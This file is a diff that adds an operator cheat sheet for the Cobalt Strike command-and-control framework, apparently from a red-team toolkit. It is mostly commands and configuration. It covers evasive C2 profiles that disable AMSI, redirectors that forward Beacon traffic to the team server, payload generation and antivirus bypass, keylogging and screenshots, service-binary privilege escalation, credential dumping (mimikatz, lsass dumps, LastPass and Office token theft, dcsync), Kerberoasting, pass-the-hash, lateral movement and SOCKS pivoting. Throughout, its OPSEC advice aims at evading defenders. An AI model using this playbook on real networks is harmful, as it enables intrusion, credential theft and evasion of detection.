@@ -1,0 +1,513 @@
+Cobalt Strike
+
+
+Use the following install location: /opt/cobaltstrike/
+    This will allow you to get third-party repos installed when running discover/update.sh.
+
+- Update
+cd /opt/cobaltstrike/
+./update
+
+- Install the Arsenal Kit
+https://download.cobaltstrike.com/scripts
+
+Includes:
+    Artifact Kit - a source code framework to build executables and DLLs that evade some AV products.
+    Mimikatz Kit
+    Process Injection Kit
+    Resource Kit
+    Sleep Mask Kit
+    User Defined Reflective Loader Kit
+
+Not included:
+    Applet Kit
+    Elevate Kit
+    Power Applet Kit
+    Sleep Mask Kit (version 4.4)
+
+cd /home/kali/Downloads/
+tar -zxf arsenal-kitYYYYMMDD.tgz
+cd arsenal-kit/
+vi arsenal_kit.config                          Make the following changes
+include_udrl_kit="true"
+include_sleepmask_kit="true"
+include_process_inject_kit="true"
+include_resource_kit="true"
+include_mimikatz_kit="true"
+
+./build_arsenal_kit.sh
+cd ..
+mv arsenal-kit /opt/cobaltstrike/
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Create a random C2 profile
+
+OPSEC: Always use a Malleable C2 profile.
+
+- Option 1
+cd /opt/cobaltstrike/third-party/tylous-sourcepoint/
+go build SourcePoint.go
+./SourcePoint -Host <IP> -Injector VirtualAllocEx -Outfile <name>.profile
+
+- Option 2
+cd /opt/cobaltstrike/third-party/FortyNorthSecurity-C2concealer/
+chmod 755 install.sh
+./install.sh
+C2concealer --variant 3 --hostname <redirector domain>
+Answer the questions.
+This will create a random profile.
+
+Validate new profile.
+./c2lint <new profile>
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# OPSEC: If you manually create a new C2 profile, change the following options:
+
+set host_stage          "false";
+set pipename            "changeme_###";        The default SMB Beacon named pipe is msagent_###
+set pipename_stager     "changeme_##";         The default is status_##
+set ssh_banner          "changeme";            The default SSH banner is Cobalt Strike 4.2
+set ssh_pipename        "changeme_####";       The default SSH Beacon named pipe is postex_ssh_####
+
+http-config {
+     set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";
+	header "Server" "Apache";
+	header "Keep-Alive" "timeout=10, max=100";
+	header "Connection" "Keep-Alive";
+	set trust_x_forwarded_for "true";
+	set vlock_useragenets "curl*,lynx*,wget*";
+}
+
+https-certificate {
+	set CN "changgme.com";
+	set O "Changgme;
+	set L "Changgme";
+	set ST "Changgme";
+	set C "US";
+	set validity "365";
+}
+
+post-ex {
+    set spawnto_x86      "%windir%\\syswow64\\dllhost.exe";
+    set spawnto_x64      "%windir%\\sysnative\\dllhost.exe";
+    set obfuscate        "true";
+    set smartinject      "true";
+    set amsi_disable     "true";
+    set pipename         "changeme_####, win\\changeme_##";
+    set keylogger        "GetAsyncKeyState";
+    set threadhint       "module!function+0x##"
+}
+
+process-inject {
+    set allocator        "NtMapViewOfSection";
+    set min_alloc        "17500";
+    set startrwx         "false";
+    set userwx           "false";
+
+    transform-x64 {
+        prepend "\x90\x90";
+    }
+}
+
+stage {
+    set userwx           "false";
+    set cleanup          "true";
+    set stomppe          "true";
+    set obfuscate        "true";
+    set name             "changeme.dll";
+}
+
+Review /opt/cobaltstrike/malleable-c2-profiles/normal/reference.profile for additional default settings.
+
+See also:
+https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/
+https://blog.zsec.uk/cobalt-strike-profiles/
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Start the team server
+
+Start a new screen session: screen -S <name>
+
+Parameters in <> are mandatory, those in [] are optional
+sudo ./teamserver <IP> <password> [Malleable C2 profile] [kill date for Beacons yyyy-mm-dd]
+sudo ./teamserver 192.168.1.5 password123 third-party/FortyNorthSecurity-C2concealer/random.profile 2022-12-31
+
+When the team server starts, it will display the SHA256 hash of the SSL cert. 
+Share this hash with teammates and have them validate the hash when connecting.
+
+- Remove old data and Beacons (optional)
+Stop the team server.
+rm -rf data/
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Connecting to the team server
+
+- Locally
+Right-click in the Terminal > Split Terminal Horizontally
+cd /opt/cobaltstrike/
+./cobaltstrike
+Host: 127.0.0.1
+Port: 50050
+User: <your name>
+Password: <password you entered above>
+Connect
+Verify Fingerprint (SHA256 hash from above) > Yes
+
+- Remote connection
+OPSEC: Never expose port 50050 directly to the internet. Always use SSH and locally forward the connection.
+ssh -f -N -L 50050:127.0.0.1:50050 user@teamserver
+Follow the steps from above.
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Redirectors
+
+OPSEC: Never allow a Beacon to make direct connections to your team server. Always use a redirector to forward the traffic.
+
+- Create 3 free Ubuntu instances in the cloud. These instances will be used for:
+Redirector 1 - domain1 (primary)
+Redirector 2 - domain2 (backup)
+Redirector 3 - DNS (long haul)
+
+- Use Apache mod_rewrite
+
+- Use socat (not OPSEC friendly)
+Forwards all traffic on these ports.
+sudo -i
+apt install -y socat
+screen -S <name>                                            Start a new screen session
+socat tcp4-listen:443,fork tcp4:<team server IP>:443        Redirector 1
+socat tcp4-listen:443,fork tcp4:<team server IP>:4443       Redirector 2
+socat -T 5 udp4-listen:53,fork udp4:<team server IP>:53     Redirector 3
+
+- Create SSL certificates for the https redirectors
+Create a Java Keystore file. Use the fully qualified domain name of your Beacon server.
+keytool -genkey -keyalg RSA -keysize 2048 -keystore domain.store
+
+Generate a Certificate Signing Request (CSR). Submit this file to your SSL certificate vendor. 
+They will verify that you are who you say are and issue a certificate.
+keytool -certreq -keyalg RSA -file domain.csr -keystore domain.store
+
+Import the Root and any Intermediate Certificates that your SSL vendor provides.
+keytool -import -trustcacerts -alias FILE -file FILE.crt -keystore domain.store
+
+Install your Domain Certificate.
+keytool -import -trustcacerts -alias mykey -file domain.crt -keystore domain.store
+ 
+Cobalt Strike expects to find the Java Keystore file in the same folder as your Malleable C2 profiles.
+/opt/cobaltstrike/malleable-c2-profiles
+
+Pro Tip: Use the following repo to automate your infrastructure setup.
+https://github.com/ezra-buckingham/terry-the-terraformer
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Listeners
+
+- Create a primary HTTPS listener
+Click headphones > Add
+Name: https_primary
+Payload: Beacon HTTPS
+HTTPS Hosts: <domain.com>
+HTTPS Host (Stager): <domain.com>
+Profile: Primary
+HTTPS Port (C2): 443
+Save
+
+- Create a backup HTTPS listener
+Click Add
+Name: https_backup
+Payload: Beacon HTTPS
+HTTPS Hosts: <domain2.com>
+HTTPS Host (Stager): <domain2.com>
+Profile: Backup
+HTTPS Port (C2): 443
+HTTPS Port (Bind): 4443
+Save
+
+- Create a DNS listener
+Click Add
+Name: dns
+Payload: Beacon DNS
+DNS Hosts: <domain3.com>
+DNS Host (Stager): <domain3.com>
+Save
+
+Using your domain registar, add the following records for each redirector:
+https            A    <redirector IP>
+dns       @      A    <redirector IP>
+dns       ns1    A    <redirector IP>
+dns       data   NS   <domain>.com.
+
+OPSEC: Blend in with the named pipes of your target environment.
+Find examples using a similar Windows VM.
+Open PowerShell: [System.IO.Directory]::GetFiles("\\.\\pipe\\")
+
+- Create SMB listener
+Click Add
+Name: smb
+Payload: Beacon SMB
+Using the example above, change the pipename.
+Save
+
+Peer-to-peer listeners allow Beacons to chain their comms together over SMB or TCP.
+This is needed when the target you compromised cannot directly reach your team server over HTTP/S.
+In graph mode, SMB Beacons are shown in yellow and TCP Beacon are shown in green.
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Generate a payload
+
+OPSEC: Staged payloads tend to have more indicators compared to stageless.
+Always prefer a fully staged/stageless (S) payload.
+Disable payload staging in your Malleable C2 profile.
+
+- When testing at home, disable Windows Defender on your target Windows VM
+Enterprise: Windows Security > Virus & threat protection > Manage settings > turn off Real-time protection > Yes
+Standard: Windows Defender settings > turn off Real-time protection
+Make sure automatic sample submission is turned off.
+
+Attacks > Scripted Web Delivery (S)
+URI Path: /a
+Listener: select the https listener > Choose
+Type: exe
+x64: Use x64 payload
+Launch > OK
+
+Transfer the payload to your target and execute.
+Click on Cobalt Strike and you will see a Beacon session appear in the top pane.
+
+- Troubleshooting
+View > Web Log
+Check for HTTP/S requests to your team server.
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Bypass AV
+
+Enable Windows Defender on your taget VM.
+Payloads > Windows Stageless Payload
+Listener: select a listener > Choose
+Output: Raw
+x64: Use x64 payload
+Generate > Save > OK
+Feed this raw shellcode into Freeze, msfvenom, or NinSyscallPacker ($) to bypass AV.
+
+- See what causes your payload to flag Windows Defender
+https://github.com/matterpreter/DefenderCheck
+https://github.com/rasta-mouse/ThreatCheck
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Beacon Object File (BOF)
+
+A compiled C program that executes within a Beacon.
+It can call Win32 and Beacon APIs without spawning and injecting into a new process.
+It is used to run small commands for a short time.
+
+Cobalt Strike > Script Manger > Load
+/opt/BOFs/anthemtotheego-inlineExecute-assembly/inlineExecuteAssembly/inlineExecute-Assembly.cna
+/opt/BOFs/outflanknl-c2-tool-collection/BOF/Kerberoast.cna
+/opt/BOFs/outflanknl-helpcolor/HelpColor.cna
+/opt/BOFs/trustedsec-remote-ops/Remote/Remote.cna
+/opt/BOFs/trustedsec-sa/SA/SA.cna
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Interact with a Beacon
+
+Right-click on a Beacon > Interact
+helpx                                                OPSEC color coded commands
+help <command>                                       Get more help on a particular command
+ctrl +/-                                             Increase or decrease the font size
+ctrl k                                               Clear the window
+
+By default, Beacon will check in every 60 seconds.
+sleep 10                                             Set Beacon sleep time to 10 seconds
+sleep 20 10                                          Set Beacon sleep time to 20 seconds with a 10% jitter (18-22s)
+sleep 0                                              Make a Beacon interactive
+
+- Jobs
+jobs                                                 List long-running post-exploitation tasks
+kill <JID>                                           Kill a process
+
+- Misc
+Beacon is fully tab-completable.
+Use the up arrow to scroll through previous commands.
+All commands and their output are written to the logs directory.
+Right-click on the X in the tab for additional options.
+https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/appendix-a_beacon-opsec-considerations.htm
+
+Select a particular Beacon > exit                    Beacon will no longer check in
+Right-click on the Beacon > Session > Remove         Remove dead Beacon
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Situational awareness
+
+pwd                                                  Print current directory
+dir                                                  BOF - List files in a directory
+ps                                                   Show process list
+tasklist                                             BOF - List running processes
+ipconfig                                             BOF - Runs and internal ipconfig commend
+netstat                                              BOF - TCP and UDP IPv4 listing ports
+arp                                                  BOF - List ARP table
+netuse_list                                          BOF - List all bound share resources or info about target local resource
+netshares                                            BOF - List shares on the local or remote computer
+windowlist                                           BOF - List visible windows in the current user session
+driversigs                                           BOF - Enumerate installed services Imagepaths to check the signing cert against known AV/EDR vendors
+
+userenum                                             List computer user accounts
+netloggedon                                          BOF - Return users logged on the local or remote computer
+netuser <user> <domain>                              BOF - Get info about specific user. Pull from domain if a domainname is specified
+netLocalGroupListMembers <group>                     BOF - List local groups from the local or specified computer
+
+domainenum                                           List user accounts in the current domain
+View > Targets                                       Discovered targets will populate
+
+Right-click on the Beacon > Explore > File Browser
+Right-click on a file > Download
+View > Downloads > select a file > Sync Files        The downloaded file is saved to your local VM
+
+screenshot <PID> x64                                 Take a single screenshot (look for svchost running on the current user)
+                                                     View > Screenshots
+
+keylogger <PID> x64                                  Start a keystroke logger (look for svchost running on the current user)
+                                                     View > Keystrokes
+
+portscan <target range> <ports> none 255             Scan a network for open services
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Privilege Escalation
+
+getsystem                                            BOF - Attempt to get SYSTEM
+getprivs                                             Enable system privileges on current token
+getuid                                               Get User ID
+
+- SharpUp
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/SharpUp.exe audit
+
+- Seatbelt
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -q DotNet                 Check for versions 2 and 3.5
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -q PowerShell             Check for version 2
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -q InterestingProcesses
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -q WindowsDefender        Look for path exclusions
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=all                All commands
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=user               User behavior-focused commands
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=system             System profiling
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=slack              Slack-specific modules
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=chromium           Chromium-specific modules
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=remote             Modules useful for remote enumeration
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=misc               Everything else
+
+- Analyze the attack surface of a host with the following Seatbelt modules:
+AutoRus, EnvironmentPath, EnvironmentVariables, FileInfo, Fileinfo, Hotfixes, InstalledProducts, MicrosoftUpdates,
+NamedPipes, OSInfo, reg, RPCMappedEndpoints, ScheduledTasks, Services, TcpConnections, and UdpConnections
+
+- PowerUp
+powershell-import /opt/PowerSploit/Privesc/PowerUp.ps1
+powerpick Invoke-PrivescAudit; "done"                If you find a vulnerable service, do the following
+Attacks > Packages > Windows Executable (S)
+Choose your listener
+Output: Windows Service EXE
+Use the same name as the vulnerable service binary
+cd to the vulnerable binary location
+upload /path/to/new/payload
+
+Cobalt Strike > Script Manger > Load
+/opt/cobaltstrike/third-party/trustedsec-remote-ops/Remote/Remote.cna
+
+sc_stop <vuln service name>                          BOF - If the vulnerable service is running, stop it
+sc_start <vuln service name>                         BOF - Start the vulnerable service, which runs the malicious payload
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Credential Abuse
+
+hashdump                                             Dump password hashes
+logonpasswords                                       Dump credentials and hashes with mimikatz
+View > Credentials
+
+lastpass                                             BOF - Search Chrome, brave memory for LastPass passwords and data
+office_tokens                                        BOF - collect Office JWT Tokens from any Office process
+
+prodump <PID of lsass.exe> <C:/Temp/dump.txt>        BOF - Dumps the specified process to the specified output file
+Right-click on the Beacon > Explore > File Browser
+Browse to the same location as the dump
+Right-click on the file > Download
+View > Downloads > select a file > Sync Files        Save downloaded file to your local VM
+
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -q CredGuard
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -q KeePass
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -q LSASettings
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -q SecPackageCreds
+
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Rubeus.exe dump
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Rubeus.exe logonsession
+
+- Kerberoasting
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Rubeus.exe kerberoast /outfile:hashes.txt
+
+Cobalt Strike > Script Manger > Load
+/opt/cobaltstrike/third-party/trustedsec-remote-ops/Injection/Injection.cna
+
+- Double-hop problem
+When using WMI or WinRM to execute code, you will receive a token with a network logon type. Creds are not
+sent to the target. You cannot double-hop and execute any additional network connections from this target.
+
+ps                                                   Show process list.
+steal_token <PID>                                    Use if someone else logged in
+make_token <domain\user> <password>                  Plaintext creds preference
+pth <domain\user> <hash>
+Use Rubeus to request/apply a new ticket
+kerberos_ticket_use (with an existing ticket)
+
+dcsync <FQDN DC> doamin\krbtgt                       Grab the KRBTGT NTLM hash
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Lateral movement
+
+Right-click on a SYSTEM Beacon > Access > Make Token
+Select a user > Build
+
+powershell-import /opt/PowerSploit/Recon/PowerView.ps1
+powerpick Get-DomainUser <user from above>; "done"   Show groups a user belongs to
+powerpick Get-DomainComputer -Ping -Properties dnshostname; "done"   Show domain computers
+powerpick Get-NetLocalGroupMember <FQDN*>; "done"    Show users in the local administrator group on a remote computer (* each computer above)
+dir \\<FQDN>\C$\                                     BOF - Check to see if you have access to a remote computer (include the trailing backslash)
+
+powerpick Get-DomainUser-SPN -Properties samaccountname, serviceprincipalnaame; "done"
+powerpick Invoke-Kerberoast <samaccountname> | fl; "done"
+
+Copy the hash and crack with john.
+make_token domain\user <password>
+dir \\<FQDN>\C$\
+
+pth domain\user <hash>
+dir \\<FQDN>\C$\
+
+powerpick Get-Domain; "done"                         Show info on the current domain
+powerpick Get-DomainTrust; "done"                    Get all domain trusts
+powerpick Get-DomainTrustMapping; "done"             Recursively mapp all domain trusts
+powerpick Get-Forest; "done"                         Show info on the current forest
+powerpick Get-ForestDomain; "done"                   Enumerate all domains in the current forest
+powerpick Get-ForestTrust; "done"                    Get all forest trusts for the current forest
+
+powerpick Get-DomainComputer -Domain <other domain> -Ping -Properties dnshostname; "done"
+powerpick Get-DomainController -Domain <other domain>; "done"
+powerpick Get-NetLocalGroupMember <other FQDN DC>; "done"
+powerpick Get-DomainForeignGroupMember -Domain <other domain>; "done"   Find users in groups outside of the given domain
+powerpick "<MemberName>" | ConvertFrom-SID; "done"
+
+What is my target?
+Who or what has control of the target?
+  Get-NetLocalGroupMember -ComputerName <computer>
+  Get-DomainGPOUserLocalGroupMapping [-Domain <domain>]
+Where is the person who has control?
+  Get-NetSession -ComputerName <computer>
+  Get-NetLoggedOn –ComputerName <computer>
+  Find-DomainUserLocation [-Domain <domain>]
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# SOCKS proxy
+
+Used to pivot additional traffic and tools into a network.
+
+sleep 0                                              Make a Beacon interactive
+socks <port>                                         Start a SOCKS4a proxy server on the team server with proxychains (example 8080)
+/etc/proxychains4.conf                               Edit your attack VM’s config at the bottom with the team server IP and proxy port
+proxychains <tool/options>
+proxychains xfreerdp /u:<domain\user> /p:<password> /v:<IP>
+socks stop                                           Stop the proxy
